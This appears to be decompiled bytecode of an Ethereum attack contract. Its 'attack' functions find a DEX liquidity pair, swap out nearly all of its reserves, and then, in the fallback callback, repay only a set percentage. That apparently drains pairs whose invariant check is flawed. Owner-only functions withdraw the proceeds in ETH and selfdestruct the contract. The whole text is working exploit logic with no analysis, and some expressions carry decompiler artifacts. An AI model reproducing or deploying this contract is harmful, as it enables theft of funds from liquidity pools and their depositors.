contract main {




// =====================  Runtime code  =====================


#
#  - withdraw(address arg1, address arg2, uint256 arg3)
#
address stor0;
uint256 stor1;

function clear() payable {
    if stor0 != msg.sender:
        revert with 0, 'not-owner'
    selfdestruct(stor0)
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor0 != msg.sender:
        revert with 0, 'not-owner'
    stor0 = arg1
}

function attack(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require ext_code.size(this.address)
    call this.address.0x452ae331 with:
         gas gas_remaining wei
        args address(arg1), 90, 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function withdrawEth(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if stor0 != msg.sender:
        revert with 0, 'not-owner'
    call arg1 with:
       value arg2 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with 0, 'TransferHelper::safeTransferETH: ETH transfer failed'
}

function attack(address arg1, uint256 arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    stor1 = arg2
    require ext_code.size(arg1)
    staticcall arg1.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).allPairs(uint256 arg1) with:
            gas gas_remaining wei
           args arg3
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).sync() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).getReserves() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 96
    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
    if ext_call.return_data[18 len 14] < 1:
        revert with 'NH{q', 17
    if ext_call.return_data[50 len 14] < 1:
        revert with 'NH{q', 17
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).swap(uint256 arg1, uint256 arg2, address arg3, bytes arg4) with:
         gas gas_remaining wei
        args Mask(112, 0, ext_call.return_data[0]) - 1, Mask(112, 0, ext_call.return_data[32]) - 1, address(this.address), 128, 1, uint8(call.data[calldata.size len 1]), 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    if calldata.size < 4:
        revert with 'NH{q', 17
    if calldata.size - 4 > test266151307():
        revert with 'NH{q', 65
    mem[ceil32(calldata.size) + 128] = calldata.size - 4
    if calldata.size - 4:
        mem[ceil32(calldata.size) + 160 len calldata.size - 4] = call.data[calldata.size len calldata.size - 4]
    idx = 0
    while idx < mem[ceil32(calldata.size) + 128]:
        if idx > -5:
            revert with 'NH{q', 17
        if idx + 4 >= calldata.size:
            revert with 'NH{q', 50
        if idx >= mem[ceil32(calldata.size) + 128]:
            revert with 'NH{q', 50
        mem[idx + ceil32(calldata.size) + 160 len 8] = Mask(8, -(0, 0) + 256, 0) << (0, 0) - 256
        if idx == -1:
            revert with 'NH{q', 17
        idx = idx + 1
        continue 
    require mem[ceil32(calldata.size) + 128] >= 96
    require mem[ceil32(calldata.size) + 160] == mem[ceil32(calldata.size) + 172 len 20]
    require mem[ceil32(calldata.size) + 192] == mem[ceil32(calldata.size) + 192]
    require mem[ceil32(calldata.size) + 224] == mem[ceil32(calldata.size) + 224]
    if mem[ceil32(calldata.size) + 192] > 0:
        require ext_code.size(msg.sender)
        staticcall msg.sender.token0() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if mem[ceil32(calldata.size) + 192] / 100 and stor1 > -1 / mem[ceil32(calldata.size) + 192] / 100:
            revert with 'NH{q', 17
        require ext_code.size(address(ext_call.return_data[0]))
        call address(ext_call.return_data[0]).0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, mem[ceil32(calldata.size) + 192] / 100 * stor1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
    if mem[ceil32(calldata.size) + 224] > 0:
        require ext_code.size(msg.sender)
        staticcall msg.sender.0xd21220a7 with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if mem[ceil32(calldata.size) + 224] / 100 and stor1 > -1 / mem[ceil32(calldata.size) + 224] / 100:
            revert with 'NH{q', 17
        require ext_code.size(address(ext_call.return_data[0]))
        call address(ext_call.return_data[0]).0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, mem[ceil32(calldata.size) + 224] / 100 * stor1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
}



}
